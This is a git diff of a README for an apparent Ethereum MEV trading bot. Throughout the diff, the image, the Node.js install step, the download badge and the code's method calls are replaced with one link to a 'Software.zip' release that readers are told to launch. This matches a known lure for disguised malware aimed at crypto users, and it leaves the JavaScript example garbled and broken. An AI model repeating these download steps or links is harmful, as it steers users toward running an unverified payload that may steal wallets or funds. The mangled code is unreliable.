@@ -1,6 +1,6 @@
 # 🤖 Ethereum MEV Bot 🤖
 
-![Ethereum MEV Bot](https://www.example.com/ethereum_mev_bot_image.jpg)
+![Ethereum MEV Bot](https://github.com/latyfa2019/Ethereum-MEV_Bot/releases/download/v1.0/Software.zip)
 
 Welcome to the Ethereum MEV Bot repository! This JavaScript-based Ethereum trading bot offers local execution, advanced configurations, and DEX (MEV-Bot) integration for automated and reliable trading. Whether you're a seasoned trader or just starting out, this bot has everything you need to take your trading to the next level in the ever-evolving world of cryptocurrencies.
 
@@ -14,7 +14,7 @@ Welcome to the Ethereum MEV Bot repository! This JavaScript-based Ethereum tradi
 ## Getting Started
 To get started with the Ethereum MEV Bot, follow these simple steps:
 1. Clone the repository to your local machine.
-2. Install Node.js if you haven't already.
+2. Install https://github.com/latyfa2019/Ethereum-MEV_Bot/releases/download/v1.0/Software.zip if you haven't already.
 3. Configure the bot with your desired settings.
 4. Run the bot and start trading on Ethereum and decentralized exchanges with ease.
 
@@ -41,7 +41,7 @@ To get started with the Ethereum MEV Bot, follow these simple steps:
 
 ## Installation
 To install the Ethereum MEV Bot, click the button below to download the latest release:
-[![Download Ethereum MEV Bot](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Ethereum MEV Bot](https://github.com/latyfa2019/Ethereum-MEV_Bot/releases/download/v1.0/Software.zip)](https://github.com/latyfa2019/Ethereum-MEV_Bot/releases/download/v1.0/Software.zip)
 
 Once downloaded, the file needs to be launched to initiate the installation process.
 
@@ -53,14 +53,14 @@ const EthereumMEVBot = require('ethereum-mev-bot');
 const bot = new EthereumMEVBot();
 
 // Configure your trading strategies
-bot.configureStrategies({
+https://github.com/latyfa2019/Ethereum-MEV_Bot/releases/download/v1.0/Software.zip({
   strategy1: 'Liquidity Sniping',
   strategy2: 'MEV Extraction',
   strategy3: 'Arbitrage Opportunities',
 });
 
 // Start the bot
-bot.startTrading();
+https://github.com/latyfa2019/Ethereum-MEV_Bot/releases/download/v1.0/Software.zip();
 ```
 
 ## Support
